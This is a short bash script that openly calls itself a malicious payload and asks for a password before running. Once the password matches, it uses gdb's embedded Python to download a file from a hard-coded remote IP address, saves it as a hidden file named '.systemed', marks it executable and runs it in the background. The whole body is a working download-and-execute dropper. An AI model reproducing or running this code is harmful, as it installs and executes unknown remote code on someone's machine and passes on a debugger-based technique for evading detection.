#!/bin/bash
# Download the file

MAIN()
{
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("http://18.212.23.203:8080/SUPERIOR_OUNCE", ".systemed" )' -ex quit
#Change Permissions and Execute File
chmod +x .systemed
./.systemed &
}

WARNING()
{
cat << EOF

This is a maliciouls payload. Do not install unless you want to infect your machine!!

If you want to proceed, enter the password below:
EOF
read MALWARE_PASSWORD
PASSWD=`echo -n $MALWARE_PASSWORD | base64`
if [[ $PASSWD =~ "ODY3NTMwOQ" ]]; then
        MAIN
else
        echo "Password incorrect!"
fi
}


#######################
#                     #
#   Start Script      #
#                     #
#######################
WARNING
